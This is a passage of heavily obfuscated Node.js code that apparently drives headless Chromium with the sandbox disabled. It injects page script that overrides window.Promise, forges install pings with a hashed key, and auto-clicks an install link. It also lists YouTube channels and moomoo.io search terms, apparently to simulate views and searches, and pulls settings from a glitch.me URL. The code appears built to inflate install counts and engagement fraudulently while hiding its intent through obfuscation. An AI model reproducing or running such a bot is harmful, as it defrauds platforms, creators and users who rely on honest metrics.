& N++], P[N >> 0xc45 + 0x314 + -0x33 * 0x4d] |= (-0x23d7 + -0x92 * 0x21 + 0x1 * 0x3729 | L >> -0x1c2d + 0x599 * -0x5 + 0xb3e * 0x5 & 0x2388 + -0x1d12 + -0x637) << y[0x23cd + 0x2de * -0x9 + 0xd5 * -0xc & N++], P[N >> -0x950 + 0x143 * -0x9 + 0x1 * 0x14ad] |= (0x3 * 0x7a + -0x44b + 0x35d | L >> -0x239 * -0x2 + -0x2580 + -0x2114 * -0x1 & -0xa * 0x1b + 0x1a06 + 0x18b9 * -0x1) << y[-0x1a * 0x67 + 0xf4d * -0x1 + -0x19c6 * -0x1 & N++], P[N >> 0x1 * -0x1b59 + -0x641 * 0x5 + 0x3aa0] |= (0x12cc * -0x1 + 0xaee + 0x9 * 0xee | -0x9b7 + -0xe2 * -0x1b + -0x60 * 0x25 & L) << y[-0x1fd * 0x5 + -0xf1 * -0x1 + 0x903 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x4 * 0x4b8 + 0x43 * 0x79 + -0x324b ? (this['block'] = P[-0x2ab * 0x1 + 0x58d * 0x1 + -0x2d2], this['start'] = N - (0x1d22 + 0x1956 + -0x3638), this['hash'](), this['hashed'] = -0xf17 * -0x1 + 0xf78 + 0x2 * -0xf47) : this['start'] = N;
                }
                return this['bytes'] > -0xd649a * -0x54 + -0x1e07df097 + 0x2dc18ee0e && (this['hBytes'] += this['bytes'] / (0x1ca7b * 0xe12c + 0xe69fe8d0 + -0x179e4d0f4) << 0x6ea + -0xfd + -0x5ed, this['bytes'] = this['bytes'] % (0x1bfb79618 + 0x1f6cccd70 + 0x17f9f * -0x1cf78)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x172a + 0x1d9a + -0x34c3;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x10a6 * -0x2 + 0x5b1 * 0x6 + -0xca] = this['block'], J[K >> 0x4c0 + -0x1 * 0x6eb + 0x22d] |= x[0x35b * 0x1 + 0x820 + -0x5bc * 0x2 & K], this['block'] = J[0x1d3 * 0xe + 0x18ce + -0x3248], K >= 0x6 * -0xeb + 0x3 * -0xf3 + 0x893 && (this['hashed'] || this['hash'](), J[0x697 + 0x1d * 0x9 + -0x79c] = this['block'], J[0x1b95 + 0x10e + -0x1c93] = J[-0x2c5 * 0x1 + -0x6b4 + -0x1 * -0x97a] = J[0xeb6 + 0x1 * 0x1dd5 + -0x1 * 0x2c89] = J[0x391 * -0x3 + 0x1ed8 + -0x1 * 0x1422] = J[-0x101 + 0x557 * -0x4 + 0x151 * 0x11] = J[-0x51f * 0x3 + 0x1b31 + -0xbcf] = J[-0xd96 * -0x2 + 0x247 * -0x3 + 0x2e7 * -0x7] = J[0x1148 + 0xfdd * -0x1 + -0x164] = J[-0x26bf + -0x2678 + 0x5 * 0xf73] = J[-0x7e9 + -0x4c7 + 0xcb9 * 0x1] = J[0x230c + -0x4a * 0x16 + -0x1ca6 * 0x1] = J[-0xf8a + -0x1b * -0x116 + -0xdbd] = J[-0x41 * -0x71 + 0x10ea + -0x2d8f] = J[-0x6 * -0xbf + -0x231e + 0x369 * 0x9] = J[0x1 * 0x560 + 0x3c9 + 0x7 * -0x14d] = J[0x1dc6 + -0x1 * 0x469 + -0x194e * 0x1] = -0x4b + -0x144d * 0x1 + 0x1498), J[-0x1099 + -0x1b9f * -0x1 + -0xaf8] = this['hBytes'] << 0x86b * -0x1 + -0x6 * -0x38b + 0xcd4 * -0x1 | this['bytes'] >>> 0x2 * 0x13e + -0x9e0 + -0x71 * -0x11, J[0x1b6f + -0x1 * -0x21c9 + -0x1463 * 0x3] = this['bytes'] << 0x1169 + -0x1 * -0x7b8 + 0xc8f * -0x2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1830 + -0x1 * 0x2177 + 0x39b7; J < 0x1f95 + -0xce6 + -0x1 * 0x125f; ++J)
                K = Q[J - (0x23dd * 0x1 + 0x1f83 + -0x435d)] ^ Q[J - (-0x3 * 0x997 + -0x9fd + -0x2 * -0x1365)] ^ Q[J - (0x7d1 + 0x2213 + -0x29d6)] ^ Q[J - (0x1919 + 0x2 * -0x11e3 + 0xabd)], Q[J] = K << -0xeea * -0x2 + -0x19 * 0x109 + -0x3f2 | K >>> 0x3e6 * -0x8 + 0x5 * -0x7d + 0x21c0;
              for (J = 0xb9e * -0x3 + 0x25 * 0x5a + 0x15d8; J < 0x1 * -0x503 + -0xd6 * 0xf + 0x11a1; J += -0x1062 + 0x5 * 0x241 + 0x522)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1aa1 + 0x22b2 + 0x76 * -0x85 | L >>> -0x1 * -0x1e3d + -0x19cd + -0x455) + (M & N | ~M & O) + P + (-0x2d7d0f * 0x388 + -0x2bbdf94a + 0x126e20fdb) + Q[J] << -0xff7 + 0x1 * -0x1041 + 0x2038) << 0x13fc + 0xf6 * -0x4 + -0x101f | P >>> 0x50b + -0x1b * -0x4f + -0xd45) + (L & (M = M << 0x26da + 0x25a + -0x2916 | M >>> 0x2 * 0x2 + -0x705 + 0x167 * 0x5) | ~L & N) + O + (0x4 * 0x2295431a + -0x1 * -0x85129db9 + -0xb4e53088) + Q[J + (-0x3e0 + -0x10d4 + 0x14b5 * 0x1)] << -0x2481 + 0xd * -0x55 + -0x1 * -0x28d2) << -0x588 + 0x293 * 0x2 + 0x67 * 0x1 | O >>> -0x1c95 + -0x3 * 0x38d + 0x2757) + (P & (L = L << -0x2391 + 0x23b * 0x3 + 0xe7f * 0x2 | L >>> 0x1 * 0x20aa + -0x1333 + -0xd75) | ~P & M) + N + (-0x6 * -0x1ca4bf9b + -0x4190782 * -0x1f + -0x61e1e7 * 0x221) + Q[J + (0xb * 0x219 + 0x1d7 + -0x18e8)] << 0x197a + 0xd * -0x13d + -0x1 * 0x961) << -0x2639 + -0x2 * 0x101c + 0x4676 | N >>> 0xf73 + 0x2a0 + -0x11f8 * 0x1) + (O & (P = P << -0x1 * 0xab2 + 0x1d33 + -0x3 * 0x621 | P >>> 0x10b2 + 0x11 * -0xbc + -0x434) | ~O & L) + M + (-0x22be1a4c + -0x56b3fd7b + 0x46a6db20 * 0x3) + Q[J + (0x2537 * 0x1 + -0x1 * 0x267e + -0x16 * -0xf)] << 0x123c + -0x521 + -0xd1b) << -0x144c * -0x1 + 0x1 * 0x16af + -0x2af6 | M >>> 0x814 + -0x1e9b + 0x2 * 0xb51) + (N & (O = O << -0x3 * 0x303 + 0x61 * -0x22 + 0x1609 * 0x1 | O >>> -0x243c * -0x1 + 0x154b * -0x1 + -0xeef * 0x1) | ~N & P) + L + (0x420bf330 + -0x85326e24 + 0x9da8f48d) + Q[J + (0x6 * 0x421 + 0x7db * -0x1 + -0x10e7)] << 0xc30 * -0x2 + 0x1 * 0x15df + 0x281, N = N << -0xadd + 0xeb0 + -0x3b5 * 0x1 | N >>> 0x3 * 0x595 + -0x1b64 + 0xaa7;
              for (; J < 0x3a * -0x76 + 0x265 * 0x5 + 0xeeb; J += -0x56f * 0x5 + -0x1180 + 0x2cb0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x361 + 0x16 * -0xf4 + 0x4 * 0x467 | L >>> -0x18b4 + 0x8bf + 0x1010) + (M ^ N ^ O) + P + (0x8b889108 + -0xa83b4e1d + -0x2 * -0x45c6545b) + Q[J] << -0x3 * 0xb92 + 0x821 + 0x5 * 0x551) << -0x1ef + -0xc35 + -0x19 * -0x91 | P >>> 0xd35 + 0xf43 + -0x1c5d) + (L ^ (M = M << 0x1 * -0x3a0 + -0x4d9 + 0x2dd * 0x3 | M >>> 0x17c9 + 0x1f98 + -0x375f) ^ N) + O + (0xc5c7d73b + -0x26152dd * -0x25 + 0x117d * -0xa01a7) + Q[J + (-0x10 * 0x179 + 0x1b * 0x14b + 0x16 * -0x84)] << 0x1c * -0x92 + -0x6a * -0xb + 0xb6a) << -0x13c3 + 0x20cb + -0xd03 | O >>> -0x1478 + -0x2544 + -0x367 * -0x11) + (P ^ (L = L << -0xc * 0xb5 + -0x9b6 + 0x1250 | L >>> 0x29 + -0x1f97 + 0x1f70) ^ M) + N + (-0x1007e1b8 + -0x1 * 0xdd630951 + 0x43f474d * 0x52) + Q[J + (0x1b5c + -0x712 * 0x2 + -0xd36)] << -0x193 * 0x7 + 0x8b * -0x2 + 0xc1b) << -0x25fe + 0xc7a + 0x1989 | N >>> 0x1b2f * 0x1 + 0x4e2 * -0x2 + -0x115 * 0x10) + (O ^ (P = P << -0x2a7 * -0xe + -0x11 * -0xf8 + -0x357c | P >>> 0x1 * -0x13e4 + -0x16e + -0x9c * -0x23) ^ L) + M + (-0x13fb55e7 * 0x2 + 0x151527eb * -0x5 + 0x1003a5f06 * 0x1) + Q[J + (-0xb * -0x34a + 0x1074 + 0x1 * -0x349f)] << 0x47 * -0x75 + -0x5 * -0x1c5 + 0x179a) << -0x3 * -0x3fd + -0x9e3 * -0x1 + -0xf3 * 0x17 | M >>> 0x17b8 + -0x1ba7 + 0x5e * 0xb) + (N ^ (O = O << 0x25c7 + -0xc5e * -0x1 + -0x10ad * 0x3 | O >>> 0x16aa + -0x1 * 0x151a + 0x18e * -0x1) ^ P) + L + (-0x1 * -0xa1fb749d + -0x1396535e + -0x1f8b359e) + Q[J + (-0x137e + -0x25c + 0x15de)] << -0x201 * 0xe + -0x32 * -0x5d + 0x9e4, N = N << 0x249 + -0x90f + 0x6e4 | N >>> -0x1059 * 0x1 + 0x2517 + -0x14bc;
              for (; J < -0x65b * 0x4 + -0x4ad * -0x3 + 0xba1 * 0x1; J += -0x393 + -0x17 * -0x19a + 0x2e * -0xb9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x392 * 0x8 + 0x2 * -0x946 + -0x9ff | L >>> -0x1 * 0x2ca + 0x664 + 0x1 * -0x37f) + (M & N | M & O | N & O) + P - (-0x538d56d5 + 0x65b82bb0 + 0x5eb96e49) + Q[J] << -0x100 + -0x1 * -0x823 + -0x723) << -0xc3f + 0x2511 + -0x7 * 0x38b | P >>> 0x3 * 0x87c + 0x8be + -0x2217) + (L & (M = M << 0x3 * -0xa7d + -0x185 * 0xe + 0x78d * 0x7 | M >>> -0x393 * -0x4 + -0xb0e + 0x6 * -0x8a) | L & N | M & N) + O - (-0x5621910b + -0x1 * 0x507c7f4b + -0x11782537a * -0x1) + Q[J + (-0x41b * -0x1 + -0x1 * 0x26d5 + -0x20b * -0x11)] << -0x1 * -0x25e1 + 0x9ad * -0x1 + -0x1c34) << -0x132c + 0x1 * 0x1264 + 0x5 * 0x29 | O >>> 0x1cc6 + 0xce5 * 0x1 + -0x2990) + (P & (L = L << 0x1 * -0x203f + 0x1936 + 0x1 * 0x727 | L >>> 0x1ac9 + 0x4 * 0x37a + -0x28af) | P & M | L & M) + N - (-0x89101f0 + -0x32acaf72 * 0x2 + 0xdecea3f8) + Q[J + (0x1ea8 + 0x1c32 + -0x3ad8)] << -0x808 + -0x576 + 0x1 * 0xd7e) << 0xe59 + 0x1ad8 + -0x292c | N >>> -0x1292 + 0x1 * 0x6fb + 0xbb2) + (O & (P = P << -0x67a * 0x4 + 0x12f * -0xb + 0x270b | P >>> -0x56b * -0x7 + -0x1532 + -0x10b9 * 0x1) | O & L | P & L) + M - (-0x9f6304ea + -0xd50dc00e + 0xc * 0x2871c0ad) + Q[J + (0x1 * -0x1f42 + 0x6e2 + 0x1863)] << -0x13e3 * -0x1 + -0x21d6 * 0x1 + 0xdf3) << -0x214f + 0x7 * -0x2a1 + -0x1 * -0x33bb | M >>> 0xcd2 + 0x1 * 0x16fc + -0x23b3) + (N & (O = O << 0x10c1 * -0x1 + -0x1 * 0x14e0 + 0x3 * 0xc95 | O >>> -0x5b6 + -0x7 * 0x28f + -0x17 * -0x107) | N & P | O & P) + L - (-0x74b436ae + 0x1 * -0x22d2ed5e + 0x1086b6730) + Q[J + (-0x21da + -0x3 * -0x5dd + 0x1047)] << -0xc3d + -0x1 * 0x12d + 0x1 * 0xd6a, N = N << 0x1274 + -0x13 * -0x5e + -0x1950 | N >>> -0x360 + -0x7c0 + 0x1 * 0xb22;
              for (; J < -0xb * -0x89 + 0x1 * -0x171e + 0x118b; J += 0x752 + -0x1 * 0x259b + 0x1af * 0x12)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x250d + 0x1906 + -0x2f * 0x152 | L >>> -0x3 * -0x9fd + 0x253 + -0x202f) + (M ^ N ^ O) + P - (-0x156358bc + 0xd9cc4f6 + 0xdeeb6 * 0x468) + Q[J] << -0xaab * 0x1 + 0x1c2c + 0x1 * -0x1181) << -0xb2f * -0x3 + 0x1491 + -0xb * 0x4eb | P >>> -0x4 * -0x6f1 + -0x26ad + 0xb04) + (L ^ (M = M << -0x1b0e + -0x2 * 0x131 + 0x1d8e | M >>> 0x1d70 + -0x7f3 + -0x157b) ^ N) + O - (0x29a * 0x243d3b + -0x152ff7fb * 0x2 + 0x1b5e2a2) + Q[J + (-0x3c1 + -0x1 * 0xeb + 0x4ad)] << 0x1438 + -0x2039 + 0xc01) << -0x1 * 0xabb + -0x8 * 0x432 + 0x2c50 | O >>> 0x1 * 0x238f + 0x11f5 + -0x3569) + (P ^ (L = L << 0x1 * -0x65f + -0xddd + 0x5 * 0x412 | L >>> 0x271 + 0x1e34 + -0x20a3) ^ M) + N - (-0x462e32b1 + 0x55892da8 + 0x26424333) + Q[J + (-0x2467 * -0x1 + -0xe7b + -0x15ea)] << -0x1ac0 + -0x1 * 0x11d6 + 0x2c96) << -0x1e14 + 0x21ef + -0x3d6 | N >>> 0x1 * -0x1e47 + -0x4 * 0x4a9 + -0x2 * -0x1883) + (O ^ (P = P << -0x11e1 + -0xbdf * -0x3 + 0x8cf * -0x2 | P >>> -0x1249 + -0x1 * 0xde9 + -0x9 * -0x394) ^ L) + M - (0x230c2f21 * -0x2 + 0x1be5a1cd + -0x423 * -0x172955) + Q[J + (0xd37 + 0x1 * -0xfda + -0x71 * -0x6)] << -0x5 * 0x6c5 + -0x5c6 + 0xd35 * 0x3) << -0x1693 + 0x2611 * -0x1 + -0x35 * -0x125 | M >>> -0x1 * 0xc53 + 0xd * 0x192 + -0x7fc) + (N ^ (O = O << -0x1a31 * 0x1 + 0x23cc * 0x1 + 0x1 * -0x97d | O >>> 0x722 + 0x740 + 0xe60 * -0x1) ^ P) + L - (0x5 * 0xe959f4b + -0x2dddae82 + 0x1a8ed035) + Q[J + (0x2036 + 0x30 + -0x2062)] << -0xf * 0x82 + 0xfa3 + -0x805, N = N << -0x3d * 0x3d + -0xdf * 0x13 + 0x1f34 | N >>> 0x1 * 0x84a + -0xee8 + 0x6a0;
              this['h0'] = this['h0'] + L << -0x15b0 + 0x1bbf + -0x60f, this['h1'] = this['h1'] + M << 0xc7 * 0x3 + 0x9 * -0x38f + 0x1db2, this['h2'] = this['h2'] + N << -0x1976 + 0x1af * -0x9 + -0x25 * -0x119, this['h3'] = this['h3'] + O << -0x13af + 0x2 * 0x16f + 0x10d1, this['h4'] = this['h4'] + P << 0xb * -0xfb + -0xb * 0x377 + 0x30e6;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x22bc + 0xdf * 0x17 + 0xecf & 0x21e3 + 0xa22 + -0x2bf6] + w[J >> -0x14fe * -0x1 + -0x142d + -0xb9 & -0x2ba + -0x175b + -0x3bc * -0x7] + w[J >> -0xbe2 + -0x3 * -0xc2d + -0x14b * 0x13 & 0x13c * 0xd + 0x5 * -0x2f9 + -0x30 * 0x6] + w[J >> -0x31 * 0x48 + -0x1d0e + -0x2 * -0x1573 & 0x1582 + -0x1 * -0x22e9 + 0x2 * -0x1c2e] + w[J >> -0x2629 + 0x3f * -0x1 + 0x2674 & -0x4d4 + 0x8 * 0xc5 + -0x145] + w[J >> -0x1 * -0x15d7 + -0x1cfc + -0x1 * -0x72d & -0x14 * 0x1ae + 0x2343 + -0x19c] + w[J >> 0x61 * -0x1a + -0x2680 + 0x29 * 0x12e & -0x146b * 0x1 + 0x1 * -0xda5 + -0x221f * -0x1] + w[-0x887 * -0x3 + 0x1b4e + 0x1c * -0x1e3 & J] + w[K >> 0x1 * -0x278 + -0x1b59 + 0x1ded & 0xa3f + -0xf56 + 0x1 * 0x526] + w[K >> -0x3ff + -0x2 * -0x3d3 + -0x38f & 0xbd9 + -0x18cf * -0x1 + -0x411 * 0x9] + w[K >> -0x2b * 0xe7 + -0x7 * -0x2cf + 0x1338 & -0x229 * 0xd + -0x1ac5 + 0x36e9] + w[K >> 0x20c2 + 0x1105 + -0x31b7 & -0x1631 + -0x103a + -0xa * -0x3d9] + w[K >> -0x1 * 0x26f + -0xdb0 * 0x2 + 0x1ddb * 0x1 & -0x243 + -0x763 + -0x47 * -0x23] + w[K >> 0x5 * 0x391 + 0x1586 + 0x1 * -0x2753 & 0x1 * -0x1611 + -0xcdb + 0x22fb] + w[K >> 0x949 * -0x3 + 0x185a + 0x1 * 0x385 & 0x1 * -0xb1d + -0x1b89 + 0x26b5] + w[0x2154 + -0x1 * 0x1bf5 + 0x154 * -0x4 & K] + w[L >> 0x1 * -0x4e5 + 0x1a52 + -0x1551 & 0x114 + -0x9 * 0x45 + -0xf * -0x18] + w[L >> -0x7cd + 0xe * -0x17f + 0x1cd7 * 0x1 & 0x6f + 0x5 * 0x3ea + -0x8a * 0x25] + w[L >> 0x38a + 0x3 * 0x283 + 0x5 * -0x233 & 0x3a7 + 0x1 * -0xeaa + 0xb12 * 0x1] + w[L >> -0x23af + 0xd * 0x6d + 0x1e36 * 0x1 & 0x67e + 0x16fe + -0x9cf * 0x3] + w[L >> 0x1aeb * 0x1 + 0x3d1 + -0x1eb0 & -0xc7 * -0x2b + -0x11f2 + -0xe * 0x11a] + w[L >> -0x2 * 0x1280 + 0x219 * 0xa + -0x100e * -0x1 & 0xb69 + 0x839 + -0x1393] + w[L >> 0x563 + -0x2 * 0x1119 + 0x2f * 0x9d & -0x1161 * 0x1 + -0x2 * -0x69b + 0x1 * 0x43a] + w[-0x92d + -0x24c + 0xb88 & L] + w[M >> 0xe57 + 0x1a * 0x89 + -0x1c25 & 0x1 * 0x231b + 0xa9d + -0x2da9] + w[M >> 0x1406 + -0x45b + -0xf93 & -0x1 * -0x211d + -0x97a + 0x1794 * -0x1] + w[M >> -0x176c + -0x2 * 0x1198 + -0x30 * -0x139 & -0x242e * 0x1 + -0x65 * 0x5f + -0x7 * -0xa88] + w[M >> -0x962 + -0x1 * -0xe4 + 0x88e & -0x80e * 0x1 + 0xe58 + -0xb * 0x91] + w[M >> 0x6b4 + 0x1 * 0x1e13 + 0x24bb * -0x1 & -0x256a + -0x1 * 0x4a + 0x25c3] + w[M >> 0x8bc * 0x2 + -0x248e + 0x98f * 0x2 & 0x65 * -0x17 + 0x1d2d + -0x140b] + w[M >> 0x2071 + -0x26 * -0x91 + 0x35f3 * -0x1 & -0x1413 + 0xb61 + 0x8c1] + w[-0xedf + -0x1b * 0xff + 0x29d3 & M] + w[N >> 0x207b + 0x1 * 0x9 + 0x2 * -0x1034 & -0x15e * -0x7 + 0x108f + -0x1a12] + w[N >> 0xa9f * -0x1 + 0x9f * 0x11 + 0xa * 0x4 & 0x803 * -0x1 + -0x20a7 * -0x1 + -0x1f * 0xcb] + w[N >> 0x2565 + 0x3 * -0x388 + -0x1ab9 & 0x42c + 0x3a * 0x5e + -0x1 * 0x1969] + w[N >> -0x9a7 + 0x8cf + 0xe8 & 0x1 * -0x1ad4 + -0x13 * 0xbc + 0x28d7] + w[N >> -0x35f * 0x1 + 0x5d3 + -0x268 & 0x1 * -0xfcf + 0x272 * -0xb + 0x2ac4] + w[N >> -0x3 * 0x60d + 0x39a + 0xe95 & -0xbfc * -0x3 + 0x230 + 0x1 * -0x2615] + w[N >> -0x1 * 0xd24 + 0xf5c + -0x6 * 0x5e & 0x115f * -0x2 + -0x1 * 0x17e1 + 0x3aae] + w[0x2038 + 0x542 * 0x3 + -0x2fef & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x97e + 0x26bb + -0x3021 * 0x1 & -0x1275 + -0x4e5 + 0x1859,
                J >> 0xfa1 * -0x1 + -0x3 * 0x455 + -0x132 * -0x18 & 0x12f * 0xd + -0x10a2 + -0x1 * -0x23e,
                J >> 0x11b6 + 0x12d9 + -0x2487 & -0x6 * -0x4b1 + 0x2399 + -0x3ec0,
                -0xcb * -0x1f + -0x21d1 + -0x9 * -0x123 & J,
                K >> -0x3 * -0xcb5 + 0x623 * 0x2 + -0x324d & 0x3ab * -0x4 + 0x5d * 0xb + -0x3e4 * -0x3,
                K >> -0x2 * 0xd23 + 0x1 * -0xf9 + 0x1b4f & 0x25d9 + -0x2 * -0x139 + 0x14 * -0x1f7,
                K >> -0x16ed + -0x15d + 0x1852 & 0xabb * -0x2 + 0x25aa + 0xf35 * -0x1,
                -0x21bd + 0x4c6 + 0x1df6 & K,
                L >> -0x15ac + -0x561 + -0x1 * -0x1b25 & 0x1cf3 + -0xae8 + 0x4 * -0x443,
                L >> 0x194f + -0x1d * -0x97 + 0x116 * -0x27 & -0x1aff * -0x1 + -0xdff * 0x1 + -0xc01,
                L >> 0x157e + 0x8e8 + -0x1e5e & 0x25bc + -0x305 * 0x1 + -0x21b8,
                0xa30 + 0x8 * 0x164 + -0x1451 & L,
                M >> -0x1 * 0x88c + 0x79d * 0x1 + 0x107 * 0x1 & 0xda4 + 0x220c + -0x1 * 0x2eb1,
                M >> 0x183c + 0x25d9 + -0x3e05 & -0x4ec + 0x3 * 0x98d + -0x16bc,
                M >> 0x94b + 0xdae + -0x16f1 * 0x1 & -0xc16 + -0x1cb8 + 0x29cd,
                -0x26e + -0x2486 + -0x27f3 * -0x1 & M,
                N >> -0x1338 + -0xc56 * -0x2 + -0x1c * 0x31 & -0x5 * -0x5df + 0x111d + -0x7 * 0x67f,
                N >> 0x266e + -0x26f6 + 0x98 & 0x2 * -0xb14 + -0x15e7 + 0x2d0e,
                N >> 0xa29 + -0x17 * -0x4b + -0x10de & -0x100 * -0x1f + 0x12bd * -0x1 + 0xce * -0xe,
                0x1c55 * -0x1 + 0x2c4 + 0x1a90 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1da1 + 0x1 * 0x185d + -0x35ea), (K = new DataView(J))['setUint32'](0xd * -0x277 + -0x2a * -0x1 + 0x1fe1, this['h0']), K['setUint32'](-0x349 + 0x13 * 0x1af + -0x6c * 0x44, this['h1']), K['setUint32'](-0x2 * 0x9e9 + 0x10a1 + 0x339, this['h2']), K['setUint32'](0xe7 + -0x1 * 0x781 + 0x6a6, this['h3']), K['setUint32'](0xca * -0x2e + -0x115 + 0x2571, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1f * -0x8 + -0x1ca9 + 0x1 * 0x1bb1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0xbf * 0x29 + -0xeb5 + -0x1 * 0xfe2;
            J[-0x3 * 0xb2b + 0x7 * 0x20 + 0x20a1 * 0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xc * 0x286 + -0x4d * -0x3e + -0x2 * 0x1877] = L => {
              const X = d;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * -0x5e7 + 0x1 * -0x1139 + -0xb53 * -0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O[X(0x1)](), K = -0x25 * -0x26 + 0x1691 + -0x1c0e;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1c3f + -0xa4e + -0x2c69 * -0x1), Promise['resolve'](-0x15a8 + -0x1 * 0xf3c + 0x24e5);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x9d8 + 0x1 * -0x53b + -0x1 * -0xf13; j < -0x24ba + 0xc3d + 0x187e; j++)
    i();
}
const NETWORK_PATIENCE = -0x96f + -0x11d0 + -0x1 * -0x3a7f + (0xbc9 + -0xb59 + 0xb48) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1fde + -0x373 * -0x9 + -0xd6 * -0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + Y(0x14) + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1972 * -0x1 + 0x5 * 0x6fe + -0x984; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 